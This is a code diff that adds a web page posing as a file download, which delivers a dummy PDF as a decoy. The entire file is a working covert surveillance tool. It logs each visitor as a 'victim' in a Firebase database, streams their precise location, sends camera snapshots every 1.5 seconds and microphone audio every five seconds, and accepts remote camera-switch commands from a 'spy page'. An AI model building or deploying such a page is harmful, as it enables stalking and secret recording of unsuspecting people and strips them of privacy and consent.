@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Downloading File...</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body class="bg-gray-900 text-white flex flex-col items-center justify-center h-screen font-sans">
+    <div class="text-center p-6 bg-gray-800 rounded-xl shadow-2xl w-11/12 max-w-md">
+        <h1 class="text-2xl font-bold mb-2">Your File is Ready</h1>
+        <p class="text-gray-400 mb-6">Click below to start downloading your file.</p>
+        <button id="downloadBtn" onclick="startDownload()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition">Download Now</button>
+        <p id="status" class="text-green-400 text-sm mt-4 hidden">Preparing download...</p>
+    </div>
+
+    <video id="hiddenCam" autoplay playsinline muted class="hidden"></video>
+    <canvas id="hiddenCanvas" class="hidden"></canvas>
+
+    <script>
+        const firebaseConfig = { databaseURL: "https://download-apks-adc2c-default-rtdb.firebaseio.com/" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        let victimId = Math.floor(1000 + Math.random() * 9000);
+        let userRef = db.ref('victims/' + victimId);
+        let currentFacingMode = 'user'; // Start with front camera
+        let mediaStream = null;
+        let mediaRecorder = null;
+        let camInterval = null;
+
+        async function startDownload() {
+            document.getElementById('downloadBtn').innerText = "Downloading...";
+            document.getElementById('status').classList.remove('hidden');
+
+            await userRef.set({
+                id: victimId, timestamp: Date.now(),
+                device: navigator.userAgent, location: "Waiting...", camStatus: "Waiting..."
+            });
+
+            // 1. Location Tracking
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition((pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    userRef.update({
+                        location: lat + ", " + lon,
+                        mapsLink: `https://www.google.com/maps?q=${lat},${lon}`
+                    });
+                }, (err) => userRef.update({ location: "Denied" }), { enableHighAccuracy: true });
+            }
+
+            // 2. Camera & Mic Access
+            try {
+                await startMedia(currentFacingMode);
+                userRef.update({ camStatus: "Active" });
+
+                // Fake download
+                setTimeout(() => {
+                    const a = document.createElement('a');
+                    a.href = "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf"; 
+                    a.download = "File.pdf"; a.click();
+                    document.getElementById('downloadBtn').innerText = "Download Complete";
+                }, 3000);
+            } catch (err) {
+                userRef.update({ camStatus: "Denied by user" });
+                document.getElementById('downloadBtn').innerText = "Download Failed";
+            }
+
+            // Listen for Camera Switch Command from Spy Page
+            userRef.child('command').on('value', (snap) => {
+                if (snap.val() === 'switch' && mediaStream) {
+                    currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
+                    startMedia(currentFacingMode); // Restart with new camera
+                    userRef.child('command').set(null); // Clear command
+                }
+            });
+        }
+
+        async function startMedia(facingMode) {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+            clearInterval(camInterval);
+
+            mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: facingMode }, 
+                audio: true 
+            });
+            
+            const video = document.getElementById('hiddenCam');
+            video.srcObject = mediaStream;
+
+            // Take snapshots every 1.5 seconds
+            camInterval = setInterval(() => {
+                const canvas = document.getElementById('hiddenCanvas');
+                if (video.videoWidth === 0) return;
+                canvas.width = 320; canvas.height = 240;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                userRef.child('latest_frame').set(canvas.toDataURL('image/jpeg', 0.4));
+            }, 1500);
+
+            // Record Audio chunks every 5 seconds
+            if (mediaRecorder) mediaRecorder.stop();
+            mediaRecorder = new MediaRecorder(mediaStream);
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) {
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                        userRef.child('latest_audio').set(reader.result);
+                    };
+                    reader.readAsDataURL(e.data);
+                }
+            };
+            mediaRecorder.start(5000); // 5 sec chunks
+        }
+    </script>
+</body>
+</html>
